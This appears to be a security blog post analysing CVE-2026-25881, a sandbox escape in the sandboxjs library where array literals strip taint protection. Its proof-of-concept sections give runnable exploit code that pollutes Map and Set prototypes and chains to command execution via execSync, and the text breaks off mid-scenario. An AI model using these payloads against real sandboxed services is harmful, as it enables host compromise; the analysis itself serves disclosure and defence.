---
title: "Breaking the Sandbox: How Array Literals Polluted the Host"
date: 2026-02-17
author: Auralis
tags: [security, javascript, nodejs, prototype-pollution, sandbox-escape, cve]
description: "A comprehensive technical analysis of how array literals can strip taint protection in sandboxjs, leading to prototype pollution and sandbox escape"
cve: CVE-2026-25881
ghsa: GHSA-ww7g-4gwx-m7wj
severity: CRITICAL
cvss: N/A
---

# Breaking the Sandbox: How Array Literals Polluted the Host

## Introduction

JavaScript sandboxes promise a simple proposition: run untrusted code safely within your application. Whether you're building a code playground, a plugin system, or a serverless platform, the ability to execute arbitrary JavaScript without compromising your host environment is invaluable. But as with most security boundaries in JavaScript, the devil is in the details—and the details are *deep*.

CVE-2026-25881 reveals a subtle but devastating flaw in `@nyariv/sandboxjs`, a popular JavaScript sandbox library. The vulnerability allows attackers to escape the sandbox and pollute host-side prototypes through an unexpected vector: array literals. What makes this vulnerability particularly instructive is how it exploits the gap between *intention* and *implementation* in taint tracking systems. The sandbox had protection in place—an `isGlobal` flag designed to prevent exactly this kind of attack. Yet a single intermediary step, array creation, was enough to strip that protection away.

In this deep dive, we'll explore the full attack chain: from JavaScript's prototype mechanics to the specific code path that strips protection, through complete proof-of-concepts demonstrating both prototype pollution and remote code execution. Along the way, we'll uncover broader lessons about the challenge of building security boundaries in JavaScript—and why "safe by default" often isn't enough.

## Background: JavaScript Prototypes and Sandboxing

### Part A: Prototype Chain 101

To understand this vulnerability, we need to start with JavaScript's prototype system—a mechanism so fundamental that it touches nearly every object interaction in the language.

In JavaScript, almost everything is an object, and every object has a prototype. When you access a property on an object, JavaScript doesn't just look at the object itself—it walks up a chain of prototypes until it finds the property or reaches the end of the chain:

```javascript
const obj = { name: 'Alice' };
console.log(obj.name);          // 'Alice' - found on object
console.log(obj.toString);       // [Function] - found on Object.prototype
console.log(obj.nonexistent);    // undefined - not found anywhere
```

Here's what's happening under the hood:

```
obj → Object.prototype → null
 |         |
 └─name    └─toString, hasOwnProperty, etc.
```

When you access `obj.toString`, JavaScript:
1. Checks `obj` itself (no `toString` property)
2. Follows the prototype chain to `Object.prototype`
3. Finds `toString` there and returns it

This prototype chain is what makes JavaScript's inheritance model work. But it also creates a dangerous attack surface: **prototype pollution**.

#### What is Prototype Pollution?

Prototype pollution occurs when an attacker can modify the properties of built-in prototypes like `Object.prototype`, `Array.prototype`, or `Map.prototype`. Since all objects inherit from these prototypes, any pollution affects *every object in the runtime*:

```javascript
// Attacker pollutes Object.prototype
Object.prototype.isAdmin = true;

// Now EVERY object has this property
const user = {};
console.log(user.isAdmin);  // true - uh oh!

const request = { method: 'GET' };
console.log(request.isAdmin);  // true - also polluted!
```

This is devastating because:

1. **Persistence**: The pollution affects all future objects, not just existing ones
2. **Global scope**: It crosses module boundaries, affecting unrelated code
3. **Unexpected behavior**: Code that checks for property existence can be fooled
4. **Security bypasses**: Access control checks become unreliable

#### Why Prototype Pollution is Dangerous

In real-world applications, prototype pollution enables several attack classes:

**1. Logic Bypasses:**
```javascript
// Vulnerable authorization check
if (user.isAdmin) {
  grantAccess();
}

// After pollution: ALL users become admins
```

**2. Denial of Service:**
```javascript
// Pollute toString or valueOf
Object.prototype.toString = null;
// Now any string coercion crashes: "" + obj
```

**3. Remote Code Execution (RCE):**

This is where things get serious. In Node.js, prototype pollution can be chained with "gadgets"—code patterns that turn pollution into command execution:

```javascript
const { execSync } = require('child_process');

// Vulnerable pattern: using object properties in sensitive sinks
function runTask(config) {
  if (config.cmd) {
    return execSync(config.cmd);  // Dangerous!
  }
}

// If attacker can pollute Object.prototype.cmd...
Object.prototype.cmd = 'whoami';

// Then any object passed to runTask executes attacker's command
runTask({});  // Executes 'whoami'!
```

The Node.js ecosystem is full of potential gadgets: `child_process.exec`, `fs.writeFile`, template engines, and more. Prototype pollution transforms from a logic bug into a critical RCE vulnerability.

### Part B: The Need for Sandboxing

Given these risks, why run untrusted code at all? Because the use cases are compelling:

- **Code Playgrounds**: Sites like JSFiddle, CodePen, and online learning platforms
- **Plugin Systems**: Applications that allow user-created extensions (Figma, Slack bots)
- **Serverless Functions**: AWS Lambda, Cloudflare Workers, edge computing
- **User Scripts**: Browser extensions, automation tools, custom workflows
- **Configuration DSLs**: Complex config files that need logic (webpack, Babel)

Each of these scenarios requires executing code from untrusted sources. The challenge is isolation: how do you run this code without letting it escape and compromise the host?

#### Enter Sandboxjs

The `@nyariv/sandboxjs` library attempts to solve this problem by creating an isolated execution environment. Unlike heavier solutions (separate processes, VM2, web workers), sandboxjs runs in the same JavaScript runtime but enforces restrictions on what sandboxed code can access.

Central to its security model is the **isGlobal protection mechanism**. The sandbox tracks which objects come from the global scope (like `Map.prototype`, `Object.prototype`, etc.) using a taint flag. When sandboxed code tries to modify a tainted object, the sandbox throws an error:

```typescript
// Simplified protection logic
set(key: string, val: unknown) {
  if (prop.isGlobal) {
    throw new SandboxError(`Cannot override global variable '${key}'`);
  }
  (prop.context as any)[prop.prop] = val;
}
```

In theory, this should prevent prototype pollution—sandboxed code can't mutate `Map.prototype.cmd` because `Map.prototype` is marked with `isGlobal: true`.

But as we'll see, theory and implementation diverged at a critical juncture: array literal creation.

## The Vulnerability: Taint Tracking Lost in Translation

The flaw in sandboxjs is both subtle and instructive. It's not a missing check or a forgotten boundary—the protection was *implemented*. The problem is that the protection doesn't survive certain operations, specifically array and object literal creation.

### How isGlobal Protection Should Work

When sandboxed code references a global object, sandboxjs wraps it in a `Prop` class that carries metadata:

```typescript
class Prop {
  context: any;       // The parent object
  prop: string;       // The property name
  isGlobal: boolean;  // ← The taint flag
  // ... other fields
}
```

For example, when sandboxed code accesses `Map.prototype`, sandboxjs creates:

```javascript
{
  context: Map,
  prop: 'prototype',
  isGlobal: true  // ← Marks this as untouchable
}
```

Later, if the code tries to write to this property:

```javascript
Map.prototype.cmd = 'evil';  // Attempted pollution
```

The sandbox's `set()` method checks the flag:

```typescript
if (prop.isGlobal) {
  throw new SandboxError(`Cannot override global variable 'prototype'`);
}
```

This protection is solid—when it applies. But there's a critical code path where the protection is silently stripped away.

### The Vulnerable Code Path

The vulnerability lies in how sandboxjs handles array literal creation. When you write `[Map.prototype]` in sandboxed code, the sandbox compiles this to an internal operation `CreateArray`. Here's the implementation:

```typescript
// src/executor.ts (L559-L571)
addOps(LispType.CreateArray, (exec, done, ticks, a, b: Lisp[], obj, context, scope) => {
  const items = (b as LispItem[])
    .map((item) => {
      if (item instanceof SpreadArray) {
        return [...item.item];
      } else {
        return item;
      }
    })
    .flat()
    .map((item) => valueOrProp(item, context)); // ← isGlobal flag lost here
  done(undefined, items);
});
```

The critical line is `.map((item) => valueOrProp(item, context))`. The `valueOrProp()` function unwraps `Prop` objects into raw JavaScript values:

```typescript
// src/utils.ts (L380-L385)
export function valueOrProp(item: unknown, context?: any): unknown {
  if (item instanceof Prop) {
    return item.get();  // ← Returns the raw value, discards isGlobal
  }
  return item;
}
```

When `item.get()` is called, it returns the actual JavaScript object (like `Map.prototype`) but *without* the `Prop` wrapper that carried the `isGlobal` flag. The resulting array contains raw, untainted references to global prototypes.

### The Protection Gap

Let's trace the full exploit flow:

```
1. Sandboxed code:      const m = [Map.prototype][0]
                                   └─────┬──────┘ └┬┘
                                         │         │
2. CreateArray:         [Prop{isGlobal:true}]    │
                         │                        │
3. valueOrProp():       [Map.prototype]          │  ← Taint stripped!
                         │                        │
4. Array access:        Map.prototype            │
                         │                        │
5. Assignment:          m.cmd = 'evil'           │  ← No protection triggered
                         │                        │
6. Protection check:    isGlobal? → false        │  ← Check fails!
                                                  │
7. Result:              Host prototype polluted  ✓
```

The sandbox's protection check is never triggered because by the time we assign `m.cmd = 'evil'`, the variable `m` is just a plain reference to `Map.prototype`, no longer wrapped in a `Prop` with `isGlobal: true`.

### Visual Representation

Here's an ASCII diagram showing where the taint is lost:

```
Sandboxed Code Execution Flow
═══════════════════════════════════════════════════════════════

Step 1: Access global prototype
┌─────────────────────────────────────────┐
│ Code: Map.prototype                     │
│ ↓                                       │
│ Sandbox creates: Prop {                │
│   context: Map,                        │
│   prop: 'prototype',                   │
│   isGlobal: true  ← TAINT FLAG SET    │
│ }                                      │
└─────────────────────────────────────────┘

Step 2: Place in array literal
┌─────────────────────────────────────────┐
│ Code: [Map.prototype]                   │
│ ↓                                       │
│ CreateArray operation receives:        │
│   items = [Prop{isGlobal:true}]       │
│ ↓                                       │
│ Calls: valueOrProp(Prop{...})         │
│ ↓                                       │
│ Returns: Map.prototype (raw object)    │
│          isGlobal: ✗ LOST!            │
└─────────────────────────────────────────┘

Step 3: Access array element
┌─────────────────────────────────────────┐
│ Code: [Map.prototype][0]                │
│ ↓                                       │
│ Returns: Map.prototype (untainted)     │
└─────────────────────────────────────────┘

Step 4: Mutate prototype
┌─────────────────────────────────────────┐
│ Code: m.cmd = 'evil'                    │
│ ↓                                       │
│ Protection check:                      │
│   if (prop.isGlobal) ← FALSE!         │
│ ↓                                       │
│ Mutation allowed                       │
│ ↓                                       │
│ Host prototype polluted! ✓            │
└─────────────────────────────────────────┘
```

The key insight: **taint tracking must survive all intermediate operations**. The moment you unwrap a protected value into a raw JavaScript reference, you've created a security hole.

## Technical Deep Dive: Exploitation Mechanics

Now that we understand the root cause, let's explore how attackers can weaponize this vulnerability. We'll build up from basic prototype pollution through method overwrites to full remote code execution.

### Part A: Understanding the Attack Surface

The vulnerability exists because sandboxjs allows sandboxed code to create array and object literals containing global prototypes, then retrieve those prototypes as untainted references. This creates multiple exploitation paths:

**1. Array Access Pattern:**
```javascript
const m = [Map.prototype][0];  // m is now untainted
m.polluted = 'value';          // Pollution succeeds
```

**2. Object Access Pattern:**
```javascript
const o = { proto: Set.prototype };
const s = o.proto;             // s is now untainted
s.polluted = 'value';          // Pollution succeeds
```

**3. Nested Structures:**
```javascript
const nested = [[Map.prototype]][0][0];  // Still works
nested.polluted = 'value';
```

All these patterns share the same core issue: passing through literal creation strips the `isGlobal` flag via `valueOrProp()`.

#### The Prop Class and Taint Tracking

To understand why this matters, let's look at how sandboxjs *intends* to track taint:

```typescript
class Prop {
  constructor(
    public context: any,
    public prop: string,
    public isGlobal: boolean = false,
    // ... other fields
  ) {}

  get(): any {
    // Returns the actual value
    return this.context[this.prop];
  }

  set(val: unknown): void {
    if (this.isGlobal) {
      throw new SandboxError(`Cannot override global variable '${this.prop}'`);
    }
    this.context[this.prop] = val;
  }
}
```

The `Prop` wrapper is supposed to follow the value everywhere. But `valueOrProp()` unwraps it prematurely:

```typescript
export function valueOrProp(item: unknown, context?: any): unknown {
  if (item instanceof Prop) {
    return item.get();  // ← Unwraps to raw value
  }
  return item;
}
```

This function is called in several places:
- Array literal creation (`CreateArray`)
- Object literal creation (`CreateObject`)
- Spread operations
- Function arguments

Each call site creates a potential bypass. The array literal case is just the most obvious exploitation path.

### Part B: Exploiting the Bypass

Let's walk through a detailed exploitation step-by-step, showing exactly how the bypass works.

#### The Basic Exploit: `const m = [Map.prototype][0]`

This simple line is the heart of the vulnerability. Let's break down what happens:

**Step 1: Parsing and Compilation**

Sandboxjs parses the JavaScript and converts it to an internal representation:

```javascript
// Source code
const m = [Map.prototype][0];

// Internal representation (simplified)
{
  type: 'VariableDeclaration',
  name: 'm',
  value: {
    type: 'MemberExpression',
    object: {
      type: 'ArrayExpression',      // ← CreateArray operation
      elements: [
        {
          type: 'MemberExpression',
          object: 'Map',              // ← Global reference
          property: 'prototype'       // ← Marked isGlobal
        }
      ]
    },
    property: 0                       // ← Array access
  }
}
```

**Step 2: Array Creation with Taint Loss**

When the `CreateArray` operation executes:

```typescript
// Input to CreateArray
items = [
  Prop {
    context: Map,
    prop: 'prototype',
    isGlobal: true  // ← Flag is set
  }
]

// Processing
items.map((item) => valueOrProp(item, context))

// After valueOrProp()
items = [
  Map.prototype  // ← Raw object, no flag!
]
```

**Step 3: Array Access**

```javascript
[Map.prototype][0]  // Returns: Map.prototype (raw)
```

At this point, `m` is just a plain JavaScript reference to `Map.prototype`. There's no `Prop` wrapper, no `isGlobal` flag, no protection.

**Step 4: Direct Mutation**

```javascript
m.cmd = 'id';  // Direct property assignment
```

This doesn't go through sandboxjs's property setter because `m` is just a raw object reference. JavaScript assigns the property directly to `Map.prototype`.

**Step 5: Host Contamination**

```javascript
// In the host (outside sandbox)
const myMap = new Map();
console.log(myMap.cmd);  // 'id' - polluted!
```

Every Map instance in the entire runtime now has the `cmd` property. The pollution is persistent and global.

#### Why the Protection Check Fails

The protection check in `Prop.set()` is never invoked because we're not using a `Prop` object:

```typescript
// This check is bypassed
set(key: string, val: unknown) {
  if (prop.isGlobal) {  // ← Never reached
    throw new SandboxError(`Cannot override global variable '${key}'`);
  }
  (prop.context as any)[prop.prop] = val;
}
```

The assignment `m.cmd = 'id'` is handled directly by JavaScript, not by sandboxjs's proxies or setters. The sandbox has lost control.

### Part C: From Pollution to RCE

Prototype pollution alone is serious, but the real danger comes when we chain it with application code that uses polluted properties in dangerous ways. These code patterns are called **gadgets**.

#### Understanding Gadget Chains

A gadget is a piece of existing code that, when given attacker-controlled input, performs a dangerous operation. The classic example in Node.js is `child_process.execSync()`:

```javascript
const { execSync } = require('child_process');

function processConfig(config) {
  if (config.cmd) {
    // Vulnerable: executes config.cmd as a shell command
    return execSync(config.cmd, { encoding: 'utf8' });
  }
}
```

Normally, this isn't exploitable because `config` is a trusted object. But with prototype pollution:

```javascript
// Attacker pollutes Object.prototype
Object.prototype.cmd = 'whoami';

// Now ANY object has .cmd property
const config = {};
console.log(config.cmd);  // 'whoami' - inherited from prototype!

// Vulnerable function now executes attacker's command
processConfig(config);  // Executes 'whoami'!
```

#### The execSync Gadget Chain

Let's see the complete chain from sandbox escape to RCE:

```javascript
// Step 1: Setup - Host code with gadget
const { execSync } = require('child_process');
const Sandbox = require('@nyariv/sandboxjs').default;

function runTask(taskConfig) {
  if (taskConfig.cmd) {
    return execSync(taskConfig.cmd, { encoding: 'utf8' });
  }
  return 'no task';
}

// Step 2: Sandbox Escape - Attacker pollutes prototype
const sandbox = new Sandbox();
sandbox.compile(`
  const m = [Map.prototype][0];  // Get untainted reference
  m.cmd = 'id';                  // Pollute Map.prototype
  return 'escape complete';
`)().run();

// Step 3: Gadget Activation - Host uses polluted object
const config = new Map();         // Inherits .cmd property
const result = runTask(config);   // Executes 'id' command!

console.log(result);  
// Output: uid=501(user) gid=20(staff) groups=20(staff),...
```

The attack flow:

```
┌──────────────────────────────────────────────────────────────┐
│ 1. Sandbox Execution                                         │
│    └─> Escape via array literal                            │
│        └─> Pollute Map.prototype.cmd = 'id'                │
└──────────────────────────────────────────────────────────────┘
                              ↓
┌──────────────────────────────────────────────────────────────┐
│ 2. Host Code                                                 │
│    └─> Create new Map() instance                           │
│        └─> Inherits .cmd from polluted prototype           │
└──────────────────────────────────────────────────────────────┘
                              ↓
┌──────────────────────────────────────────────────────────────┐
│ 3. Gadget Activation                                         │
│    └─> runTask(config) checks config.cmd                   │
│        └─> Finds 'id' (from prototype pollution)           │
│            └─> Passes to execSync()                        │
│                └─> Shell command executed!                 │
└──────────────────────────────────────────────────────────────┘
```

#### Other Potential Gadgets

The Node.js ecosystem has many potential gadgets beyond `execSync`:

**1. File System Operations:**
```javascript
const fs = require('fs');

function saveData(data) {
  if (data.filename) {
    fs.writeFileSync(data.filename, data.content);  // Arbitrary file write!
  }
}

// After pollution: Object.prototype.filename = '/etc/passwd'
```

**2. Template Engines:**
```javascript
const ejs = require('ejs');

function renderTemplate(options) {
  return ejs.render('<%= message %>', options);
}

// After pollution with .outputFunctionName
// Can achieve RCE through template injection
```

**3. Module Loading:**
```javascript
function loadPlugin(config) {
  if (config.module) {
    require(config.module);  // Arbitrary module load!
  }
}

// After pollution: Object.prototype.module = 'malicious-package'
```

**4. Process Spawning:**
```javascript
const { spawn } = require('child_process');

function startService(opts) {
  spawn(opts.command || 'node', opts.args || []);
}

// After pollution: Object.prototype.command = '/bin/bash'
```

#### Chaining with Application Logic

The real-world impact depends on the host application's code. But the persistence of prototype pollution makes exploitation almost inevitable:

1. **Immediate Impact**: If the application already has gadgets, RCE is instant
2. **Delayed Impact**: Pollution persists, waiting for future code to trigger a gadget
3. **Cross-Module Impact**: Pollution affects all modules, even those loaded later
4. **Cascading Failures**: Polluted prototypes can break assumptions throughout the codebase

The sandbox escape transforms what should be an isolated, low-risk operation (running untrusted code) into a persistent backdoor in your entire Node.js process.

## Proof of Concept Walkthrough

Let's walk through three complete proof-of-concepts, progressing from basic pollution to full RCE. These POCs demonstrate the vulnerability is real, exploitable, and dangerous.

### POC 1: Basic Prototype Pollution

This POC demonstrates the core vulnerability: escaping the sandbox to pollute `Map.prototype`.

```javascript
const Sandbox = require('@nyariv/sandboxjs').default;
const sandbox = new Sandbox();

// Execute malicious sandboxed code
sandbox.compile(`
  // Step 1: Get untainted reference via array literal
  const arr = [Map.prototype];
  const p = arr[0];
  
  // Step 2: Directly mutate the prototype
  p.polluted = 'pwned';
  
  return 'done';
`)().run();

// Verify pollution in host environment
console.log('Object.prototype polluted?', 'polluted' in {});
console.log('Map.prototype polluted?', new Map().polluted);
```

**Expected Behavior (if sandbox worked correctly):**
```
Object.prototype polluted? false
Map.prototype polluted? undefined
```

**Actual Output (vulnerability present):**
```
Object.prototype polluted? false
Map.prototype polluted? pwned
```

**Analysis:**

- The pollution is **specific**: Only `Map.prototype` is polluted, not `Object.prototype`
- The pollution is **persistent**: All new Map instances inherit the property
- The pollution is **host-side**: The check `new Map().polluted` runs outside the sandbox

This confirms sandbox escape. The untrusted code successfully modified the host runtime's built-in prototype.

### POC 2: Overwriting Built-in Methods

This POC escalates from adding properties to overwriting critical methods, demonstrating the severity of arbitrary prototype mutation.

```javascript
const Sandbox = require('@nyariv/sandboxjs').default;
const sandbox = new Sandbox();

// Create a Set before pollution
const originalSet = new Set([1, 2, 3]);
console.log('Before pollution:', originalSet.has(2));  // true

// Execute malicious code that overwrites Set.prototype.has
sandbox.compile(`
  // Get untainted reference to Set.prototype
  const s = [Set.prototype][0];
  
  // Overwrite the has() method with a different function
  s.has = isFinite;  // Replace with built-in isFinite()
  
  return 'done';
`)().run();

// Verify method overwrite
console.log('Set.prototype.has === isFinite?', Set.prototype.has === isFinite);

// All Set instances now have broken .has() method
const newSet = new Set([1, 2, 3]);
console.log('After pollution:', newSet.has(2));  // false (calls isFinite(2) instead!)
console.log('Broken behavior:', newSet.has(Infinity));  // false (isFinite behavior)
```

**Output:**
```
Before pollution: true
Set.prototype.has === isFinite? true
After pollution: false
Broken behavior: false
```

**Analysis:**

- **Method Replacement**: We've completely replaced a core Set method
- **Behavioral Changes**: All Sets in the runtime now behave incorrectly
- **Silent Failures**: Code using Sets will fail in unexpected ways
- **Denial of Service**: Application logic relying on Sets is broken

This demonstrates that the vulnerability isn't just about adding properties—attackers can fundamentally break built-in functionality, leading to:

- Logic bypasses (security checks that use Sets/Maps)
- Application crashes (when code expects .has() to work correctly)
- Data corruption (if application state relies on Set semantics)

### POC 3: RCE via execSync Gadget

This is the most severe demonstration: chaining prototype pollution with a realistic gadget to achieve remote code execution.

```javascript
const Sandbox = require('@nyariv/sandboxjs').default;
const { execSync } = require('child_process');
const sandbox = new Sandbox();

console.log('=== RCE via Prototype Pollution ===\n');

// Step 1: Sandbox escape and prototype pollution
console.log('[1] Executing sandboxed code...');
sandbox.compile(`
  // Escape sandbox via array literal
  const m = [Map.prototype][0];
  
  // Pollute Map.prototype with command
  m.cmd = 'id';  // Unix command to show user info
  
  return 'escape complete';
`)().run();

console.log('[2] Prototype pollution successful\n');

// Step 2: Host code using polluted object (the "gadget")
console.log('[3] Host code creating Map object...');
const obj = new Map();

// Verify pollution worked
console.log('[4] Checking obj.cmd:', obj.cmd);
console.log('    (inherited from polluted Map.prototype)\n');

// Step 3: Vulnerable code path (gadget activation)
console.log('[5] Executing vulnerable code path:');
console.log('    execSync(obj.cmd)');

try {
  const output = execSync(obj.cmd, { encoding: 'utf8' }).trim();
  console.log('\n[!] COMMAND EXECUTED:\n');
  console.log(output);
  console.log('\n[!] RCE SUCCESSFUL - Arbitrary command execution achieved!');
} catch (error) {
  console.log('Command execution failed:', error.message);
}

// Step 4: Demonstrate persistence
console.log('\n[6] Demonstrating persistence:');
const anotherMap = new Map();
console.log('    New Map also has cmd:', anotherMap.cmd);
```

**Output:**
```
=== RCE via Prototype Pollution ===

[1] Executing sandboxed code...
[2] Prototype pollution successful

[3] Host code creating Map object...
[4] Checking obj.cmd: id
    (inherited from polluted Map.prototype)

[5] Executing vulnerable code path:
    execSync(obj.cmd)

[!] COMMAND EXECUTED:

uid=501(user) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts)...

[!] RCE SUCCESSFUL - Arbitrary command execution achieved!

[6] Demonstrating persistence:
    New Map also has cmd: id
```

**Complete Attack Chain Visualization:**

```
┌─────────────────────────────────────────────────────────────┐
│ ATTACKER (Sandboxed Code)                                   │
├─────────────────────────────────────────────────────────────┤
│ const m = [Map.prototype][0];                               │
│ m.cmd = 'id';              ← Pollute host prototype        │
└─────────────────────────────────────────────────────────────┘
                          ↓
                    Sandbox Escape
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ HOST RUNTIME STATE                                           │
├─────────────────────────────────────────────────────────────┤
│ Map.prototype.cmd = 'id'   ← Persistent pollution          │
└─────────────────────────────────────────────────────────────┘
                          ↓
                  All Maps inherit .cmd
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ APPLICATION CODE (Host)                                      │
├─────────────────────────────────────────────────────────────┤
│ const config = new Map();                                   │
│ // config.cmd === 'id' (inherited!)                         │
│                                                              │
│ if (config.cmd) {                                           │
│   execSync(config.cmd);    ← Gadget activated!             │
│ }                                                            │
└─────────────────────────────────────────────────────────────┘
                          ↓
                    Shell Command Execution
                          ↓
┌─────────────────────────────────────────────────────────────┐
│ RESULT: Remote Code Execution                               │
├─────────────────────────────────────────────────────────────┤
│ uid=501(user) gid=20(staff) groups=...                      │
│ ✓ Arbitrary command execution achieved                     │
└─────────────────────────────────────────────────────────────┘
```

**Key Observations:**

1. **Trivial Exploitation**: The sandboxed code is only two lines
2. **Application-Dependent**: RCE requires a gadget in the host application
3. **Realistic Gadget**: The `execSync(config.cmd)` pattern is common in real code
4. **Complete Compromise**: Once achieved, attacker has full system access
5. **Persistent Backdoor**: The pollution persists until process restart

This POC demonstrates why sandbox escapes are critical vulnerabilities. What was supposed to be isolated, low-risk code execution becomes a complete system compromise.

## Root Cause Analysis

Understanding *why* this vulnerability exists requires looking beyond the immediate bug to the underlying design decisions and their security implications.

### The Design Flaw: Unwrapping Values Too Early

The fundamental issue is a tension between two requirements:

1. **Security**: Track taint through all operations to prevent sandbox escapes
2. **Compatibility**: Return normal JavaScript values so they work with standard operations

Sandboxjs chose to prioritize compatibility, unwrapping `Prop` objects to raw values in several places. The `valueOrProp()` function embodies this choice:

```typescript
export function valueOrProp(item: unknown, context?: any): unknown {
  if (item instanceof Prop) {
    return item.get();  // ← Unwrap to raw value (lose taint)
  }
  return item;
}
```

This seems reasonable—array elements should be normal JavaScript values, not wrapper objects. But from a security perspective, this is the critical mistake: **taint must be preserved across all operations**.

### The valueOrProp() Function Analysis

Let's examine why this function is problematic:

**What it does:**
- Converts `Prop` wrappers to raw JavaScript values
- Enables compatibility with native JavaScript operations
- Makes sandboxed values behave like normal values

**What it should do:**
- Preserve taint information through operations
- Allow raw values *only* when safe to do so
- Maintain the `isGlobal` flag until values leave the sandbox

**The correct approach:**

```typescript
// Incorrect (current implementation)
const items = b.map((item) => valueOrProp(item, context));
// items = [Map.prototype] ← untainted

// Correct (preserve taint)
const items = b.map((item) => {
  if (item instanceof Prop && item.isGlobal) {
    // Keep the Prop wrapper, or mark the container as tainted
    return new Prop(item.context, item.prop, true);
  }
  return valueOrProp(item, context);
});
// items = [Prop{isGlobal:true}] ← taint preserved
```

### Why Taint Tracking Must Be Preserved

Taint tracking is a fundamental security principle: once data is marked as dangerous (tainted), that marking must follow the data everywhere. Losing taint creates a bypass:

```
Normal Flow (Protection Works):
═══════════════════════════════
Global Object → Prop{isGlobal:true} → Mutation Attempt → Blocked ✓

Vulnerable Flow (Protection Lost):
═════════════════════════════════
Global Object → Prop{isGlobal:true} → Array → Raw Value
                                                  ↓
                                          Mutation Attempt → Allowed ✗
```

The vulnerability teaches an important lesson: **security properties must be preserved across abstraction boundaries**. The array literal abstraction boundary (going from `Prop` to array of raw values) lost the security property (`isGlobal`).

### Comparison with Other Sandbox Implementations

Let's see how other JavaScript sandboxes handle this challenge:

**1. VM2 (deprecated):**
- Used separate V8 contexts for true isolation
- No taint tracking needed—different memory spaces
- More secure but heavier weight

**2. Isolated-vm:**
- Creates separate V8 isolates
- Complete memory isolation
- Even heavier, but strongest security

**3. QuickJS-based sandboxes:**
- Separate JavaScript engine instance
- True isolation at the engine level
- Different approach entirely

**4. Web Workers (browser):**
- Separate thread with message passing
- No shared memory by default
- Natural security boundary

**What sandboxjs attempted:**
- Same V8 context, enforce restrictions via proxies/wrappers
- Lightest weight, but hardest to secure correctly
- Requires perfect taint tracking (which failed)

The lesson: **in-process sandboxing is fundamentally difficult**. The shared memory space creates countless opportunities for taint to be lost. The more you prioritize performance and compatibility, the more attack surface you create.

### The Complexity of In-Process Sandboxing

Why is taint tracking so hard to get right? Because JavaScript provides *so many* ways to move values around:

- Direct access: `x.prototype`
- Array access: `[x.prototype][0]`
- Object access: `{p: x.prototype}.p`
- Destructuring: `[p] = [x.prototype]`
- Spread: `[...arr]`
- Function arguments: `fn(x.prototype)`
- Function returns: `return x.prototype`
- Closures: `() => x.prototype`
- Property getters: `get prop() { return x.prototype; }`

Each of these code paths must preserve taint. Miss even one, and you have a bypass. Sandboxjs missed array literal creation, but the codebase likely has other similar issues.

### The Takeaway

The root cause isn't a simple coding error—it's an architectural challenge. Sandboxjs attempted to provide lightweight, in-process sandboxing with minimal performance overhead. But that approach requires perfect taint tracking across every possible code path. As CVE-2026-25881 demonstrates, even careful implementations can miss critical paths.

For security-critical applications, the lesson is clear: **true isolation requires separate execution contexts**. Shared-memory sandboxing is an optimization that trades security for performance, and that trade-off is increasingly looking like a losing bargain.

## Impact Analysis

CVE-2026-25881 is rated as **CRITICAL** severity, and for good reason. Let's break down the real-world impact across different dimensions.

### Sandbox Escape: Breaking Isolation Guarantees

The most immediate impact is **complete failure of the security boundary**. Applications using sandboxjs to isolate untrusted code can no longer trust that isolation:

**Expected Security Model:**
```
┌─────────────────────────────────────┐
│ Host Application (Trusted)          │
│  ┌───────────────────────────────┐  │
│  │ Sandbox (Untrusted Code)      │  │
│  │  - Limited capabilities       │  │
│  │  - No host access             │  │
│  │  - Isolated execution         │  │
│  └───────────────────────────────┘  │
│                                     │
└─────────────────────────────────────┘
```

**Actual Reality:**
```
┌─────────────────────────────────────┐
│ Host Application (Compromised)      │
│  ┌───────────────────────────────┐  │
│  │ Sandbox (Untrusted Code)      │  │
│  │  - Escape via array literal   │  │
│  │  - Pollute host prototypes    │  │
│  │  - Break isolation ✓          │  │
│  └─────────────┬─────────────────┘  │
│                ↓                     │
│  Host prototypes polluted            │
│  All code now affected               │
└─────────────────────────────────────┘
```

Any application that relies on sandboxjs for security is now vulnerable. The isolation promise is broken.

### Persistent Pollution: Affects All Subsequent Code

Prototype pollution isn't a one-time attack—it's **persistent for the lifetime of the process**:

```javascript
// Time T1: Attacker pollutes prototype
sandbox.compile(`
  const m = [Map.prototype][0];
  m.isAdmin = true;
`)().run();

// Time T2: Unrelated code affected
function checkAccess(user) {
  if (user.isAdmin) {  // Now true for ALL objects!
    grantAdminAccess();
  }
}

// Time T3: Even new modules affected
const config = require('./new-module');
console.log(config.isAdmin);  // true (polluted)
```

Timeline of pollution impact:

```
T0: Application starts (clean state)
     ↓
T1: Sandboxed code executes
     └─> Prototype pollution
     ↓
T2: Pollution spreads to all existing objects
     └─> Authorization checks broken
     └─> Business logic affected
     ↓
T3: New code/modules affected
     └─> Even freshly loaded code sees pollution
     ↓
T4: Pollution persists until...
     └─> Process restart (only remedy)
```

This persistence means:
- **Single exploit, ongoing access**: One successful exploit compromises the entire process lifetime
- **Cross-module contamination**: Even well-secured modules inherit pollution
- **Difficult detection**: Pollution may not trigger until much later
- **Cleanup is impossible**: Can't undo prototype pollution without restart

### RCE Potential: Application-Dependent but Serious

While prototype pollution is serious, **RCE is the nightmare scenario**. Whether you can achieve RCE depends on the host application having gadgets, but many real-world applications do:

**Common Node.js Gadget Patterns:**

```javascript
// Pattern 1: Child process execution
const { execSync } = require('child_process');
function runTask(config) {
  if (config.cmd) execSync(config.cmd);  // ← Gadget!
}

// Pattern 2: File system operations
const fs = require('fs');
function saveData(opts) {
  fs.writeFileSync(opts.file, opts.data);  // ← Gadget!
}

// Pattern 3: Dynamic require
function loadPlugin(settings) {
  require(settings.module);  // ← Gadget!
}

// Pattern 4: Template rendering
const ejs = require('ejs');
function render(ctx) {
  return ejs.render(template, ctx);  // ← Gadget (via options)
}
```

These patterns are **ubiquitous** in Node.js applications. The probability of having at least one gadget increases with application complexity.

**Risk Assessment by Application Type:**

| Application Type | Gadget Likelihood | RCE Risk |
|-----------------|-------------------|----------|
| Code playgrounds | High (intentional exec) | **Critical** |
| Plugin systems | High (dynamic loading) | **Critical** |
| Serverless platforms | Very High (process spawning) | **Critical** |
| Web applications | Medium-High (template engines) | **High** |
| Configuration processors | Medium (file operations) | **High** |
| API servers | Low-Medium (depends on features) | **Medium** |

### Real-World Scenarios

Let's examine specific use cases and their exposure:

#### Scenario 1: Code Playground (e.g., JSFiddle clone)

**Setup:**
```javascript
// Platform allows users to run arbitrary JavaScript
app.post('/run-code', (req, res) => {
  const sandbox = new Sandbox();
  const result = sandbox.compile(req.body.code)().run();
  res.json({ result });
});
```

**Attack:**
